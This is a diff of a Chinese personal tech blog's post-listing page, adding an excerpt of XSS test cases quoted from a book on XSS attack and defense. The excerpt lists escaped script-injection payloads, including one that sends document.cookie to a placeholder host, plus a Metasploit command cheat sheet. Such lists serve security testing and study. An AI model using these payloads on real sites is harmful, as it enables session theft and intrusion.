@@ -80,6 +80,26 @@ if (!doNotTrack) {
 	</header><article class="list__item post">
 	<header class="list__header">
 		<h2 class="list__title post__title">
+			<a href="/posts/xss%E6%B5%8B%E8%AF%95%E7%94%A8%E4%BE%8B/" rel="bookmark">
+			xss测试用例
+			</a>
+		</h2>
+		<div class="list__meta meta"><div class="meta__item-author meta__item">
+	<svg class="meta__icon icon icon-author" width="16" height="16" viewBox="0 0 12 16"><path d="M6 1c2.2 0 3.5 2 3.5 4.5C9.5 7 8.9 8.2 8 9c2.9.8 4 2.5 4 5v1H0v-1c0-2.5 1.1-4.2 4-5-.9-.8-1.5-2-1.5-3.5C2.5 3 3.8 1 6 1z"/></svg><span class="meta__text">Roy</span>
+</div>
+<div class="meta__item-datetime meta__item">
+	<svg class="meta__icon icon icon-time" width="16" height="14" viewBox="0 0 30 28"><path d="M15 0C7 0 1 6 1 14s6 14 14 14 14-6 14-14S23 0 15 0zm0 25C9 25 4 20 4 14S9 3 15 3s11 5 11 11-5 11-11 11zm1-18h-2v8.4l6.8 4.4L22 18l-6-3.8V7z"/></svg><time class="meta__text" datetime="2014-12-10T21:43:58Z">2014-12-10</time></div></div>
+	</header>
+	<div class="content list__excerpt post__content clearfix">
+		摘录于《XSS跨站脚本攻击剖析与防御》，希望大家支持正版，写的还是不错的。
+&lt;script&gt;alert(1);&lt;/script&gt; &lt;script&gt;alert(&#39;xss&#39;);&lt;/script&gt; &lt;script src=&#34;xxx://xxx.xxx&#34;&gt;&lt;/script&gt; &lt;script&gt;location.href=&#34;xxx://xxx.xx/cookie=&#34;+escape(document.cookie)&lt;/script&gt; &lt;scr&lt;script&gt;ipt&gt;alert(&#39;xss&#39;);&lt;/scr&lt;script&gt;ipt&gt; &lt;script&gt;alert(String.fromCharCode(88,83,83))&lt;/script&gt; &lt;img src=xx.png onerror=alert(/xss/) /&gt; &lt;style&gt;@im\port&#39;\ja\vasc\ript:alert(\&#34;xss\&#34;);&lt;/style&gt; &lt;?
+	</div>
+	<div class="list__footer clearfix">
+		<a class="list__footer-readmore btn" href="/posts/xss%E6%B5%8B%E8%AF%95%E7%94%A8%E4%BE%8B/">Read more…</a>
+	</div>
+</article><article class="list__item post">
+	<header class="list__header">
+		<h2 class="list__title post__title">
 			<a href="/posts/%E4%B8%8D%E5%8F%AF%E8%A2%AB%E8%AF%81%E6%98%8E%E7%9A%84%E7%88%B1/" rel="bookmark">
 			不可被证明的爱
 			</a>
@@ -119,7 +139,7 @@ if (!doNotTrack) {
 	</header>
 	<div class="content list__excerpt post__content clearfix">
 		Ganglia+RRDTool这对组合可以说是不错的机群监控软件了，在centos6下安装是十分简单的，服务端安装
-yum install rrdtool-develyum install ganglia-gmetadyum install ganglia-web然后配置文件基本不用大量修改，位于/etc/ganglia/gmetad.
+yum install rrdtool-develyum install ganglia-gmetadyum install ganglia-web 然后配置文件基本不用大量修改，位于/etc/ganglia/gmetad.
 	</div>
 	<div class="list__footer clearfix">
 		<a class="list__footer-readmore btn" href="/posts/centos%E9%83%A8%E7%BD%B2ganglia/">Read more…</a>
@@ -186,35 +206,10 @@ import sys reload(sys) sys.
 	</header>
 	<div class="content list__excerpt post__content clearfix">
 		节选自《metasploit渗透测试指南》
-show exploits 列出所有渗透攻击模块show payloads 列出所有攻击载荷show auxiliary 列出所有辅助模块search name 搜索info 列出详细信息use name 使用show options 查看参数show targets 查看某模块支持的目标平台show advanced 查看高级选项set autorunscript migrate -f 攻击完成后自动迁移到另一个进程check 检测目标是否对选定的渗透攻击存在相应的漏洞exploit 执行渗透攻击exploit -j 后台执行exploit -z 成功渗透后不与会话交互exploit -e encoder 指定攻击载荷编码方式exploit -h 帮助sessions -l 列出多个会话sessions -l -v 列出会话同时列出详细信息sessions -s scritp 在所有活跃会话中执行特定meterpreter脚本sessions -K 杀死所有活跃会话sessions -c cmd 在所有活跃会话上执行某命定sessions -u sessionID 升级一个普通的win shell 到 meterpreter shelldb_conreate name 创建数据库db_connect name 链接数据库db_namp 把namp的扫描结果存入数据库 hosts services查看结果db_autopwn -hdb_autopwn -p -r-e 对发现的所有端口执行db_autopwndb_destroy 删除当前数据库db_destory user:pswd@host:port/dbnamedb_status 查看 meterpreter命令
+show exploits 列出所有渗透攻击模块show payloads 列出所有攻击载荷show auxiliary 列出所有辅助模块search name 搜索info 列出详细信息use name 使用show options 查看参数show targets 查看某模块支持的目标平台show advanced 查看高级选项set autorunscript migrate -f 攻击完成后自动迁移到另一个进程check 检测目标是否对选定的渗透攻击存在相应的漏洞exploit 执行渗透攻击exploit -j 后台执行exploit -z 成功渗透后不与会话交互exploit -e encoder 指定攻击载荷编码方式exploit -h 帮助sessions -l 列出多个会话sessions -l -v 列出会话同时列出详细信息sessions -s scritp 在所有活跃会话中执行特定meterpreter脚本sessions -K 杀死所有活跃会话sessions -c cmd 在所有活跃会话上执行某命定sessions -u sessionID 升级一个普通的win shell 到 meterpreter shelldb_conreate name 创建数据库db_connect name 链接数据库db_namp 把namp的扫描结果存入数据库 hosts services查看结果db_autopwn -hdb_autopwn -p -r-e 对发现的所有端口执行db_autopwndb_destroy 删除当前数据库db_destory user:pswd@host:port/dbnamedb_status 查看 meterpreter命令
 	</div>
 	<div class="list__footer clearfix">
 		<a class="list__footer-readmore btn" href="/posts/metasploit%E5%91%BD%E4%BB%A4%E5%8F%82%E8%80%83/">Read more…</a>
-	</div>
-</article><article class="list__item post">
-	<header class="list__header">
-		<h2 class="list__title post__title">
-			<a href="/posts/centos%E5%AE%89%E8%A3%85denyhosts/" rel="bookmark">
-			centos安装denyhosts
-			</a>
-		</h2>
-		<div class="list__meta meta"><div class="meta__item-author meta__item">
-	<svg class="meta__icon icon icon-author" width="16" height="16" viewBox="0 0 12 16"><path d="M6 1c2.2 0 3.5 2 3.5 4.5C9.5 7 8.9 8.2 8 9c2.9.8 4 2.5 4 5v1H0v-1c0-2.5 1.1-4.2 4-5-.9-.8-1.5-2-1.5-3.5C2.5 3 3.8 1 6 1z"/></svg><span class="meta__text">Roy</span>
-</div>
-<div class="meta__item-datetime meta__item">
-	<svg class="meta__icon icon icon-time" width="16" height="14" viewBox="0 0 30 28"><path d="M15 0C7 0 1 6 1 14s6 14 14 14 14-6 14-14S23 0 15 0zm0 25C9 25 4 20 4 14S9 3 15 3s11 5 11 11-5 11-11 11zm1-18h-2v8.4l6.8 4.4L22 18l-6-3.8V7z"/></svg><time class="meta__text" datetime="2014-10-20T17:37:42Z">2014-10-20</time></div><div class="meta__item-categories meta__item"><svg class="meta__icon icon icon-category" width="16" height="16" viewBox="0 0 16 16"><path d="m7 2l1 2h8v11h-16v-13z"/></svg><span class="meta__text"><a class="meta__link" href="/categories/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/" rel="category">操作系统</a>
-	</span>
-</div></div>
-	</header>
-	<div class="content list__excerpt post__content clearfix">
-		最近不知道得罪了哪路大神，一直都有坏人暴力破解本站的SSH登录密码。想安安静静的写博客就这么难么&hellip;没办法，那就安个denyhosts吧。
-centos下直接使用Yum安装即可:yum install denyhosts.noarch
-当然也可以下载编译安装。安装好后，配置文件是/etc/denyhosts.conf,参数说明如下:
-SECURE_LOG = /var/log/secure#ssh日志文件
-HOSTS_DENY = /etc/hosts.
-	</div>
-	<div class="list__footer clearfix">
-		<a class="list__footer-readmore btn" href="/posts/centos%E5%AE%89%E8%A3%85denyhosts/">Read more…</a>
 	</div>
 </article>
 </main>
@@ -240,11 +235,11 @@ HOSTS_DENY = /etc/hosts.
 	<h4 class="widget__title">Recent Posts</h4>
 	<div class="widget__content">
 		<ul class="widget__list">
+			<li class="widget__item"><a class="widget__link" href="/posts/%E5%9C%A8golang%E4%B8%AD%E4%BF%9D%E6%8C%81tcp%E9%93%BE%E6%8E%A5/">在Golang中保持TCP链接</a></li>
 			<li class="widget__item"><a class="widget__link" href="/posts/iptables%E7%AC%94%E8%AE%B0/">Iptables笔记</a></li>
 			<li class="widget__item"><a class="widget__link" href="/posts/ebpf%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B05/">eBPF学习笔记5</a></li>
 			<li class="widget__item"><a class="widget__link" href="/posts/ebpf%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B04/">eBPF学习笔记4</a></li>
 			<li class="widget__item"><a class="widget__link" href="/posts/ebpf%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B03/">eBPF学习笔记3</a></li>
-			<li class="widget__item"><a class="widget__link" href="/posts/ebpf%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B02/">eBPF学习笔记2</a></li>
 		</ul>
 	</div>
 </div>
@@ -282,11 +277,11 @@ HOSTS_DENY = /etc/hosts.
 				</li>
 			<li class="widget__item">
 				<a class="widget__link" href="/categories/%E7%BC%96%E7%A8%8B%E6%8A%80%E6%9C%AF/">编程技术</a>&nbsp;
-				<span class="widget__counter widget__counter--bubble">131</span>
+				<span class="widget__counter widget__counter--bubble">132</span>
 				</li>
 			<li class="widget__item">
 				<a class="widget__link" href="/categories/%E8%8F%9C%E9%B8%9F%E7%BF%BB%E8%AF%91%E5%B1%8B/">菜鸟翻译屋</a>&nbsp;
-				<span class="widget__counter widget__counter--bubble">30</span>
+				<span class="widget__counter widget__counter--bubble">31</span>
 				</li>
 			<li class="widget__item">
 				<a class="widget__link" href="/categories/%E9%87%91%E8%9E%8D%E7%90%86%E8%B4%A2/">金融理财</a>&nbsp;
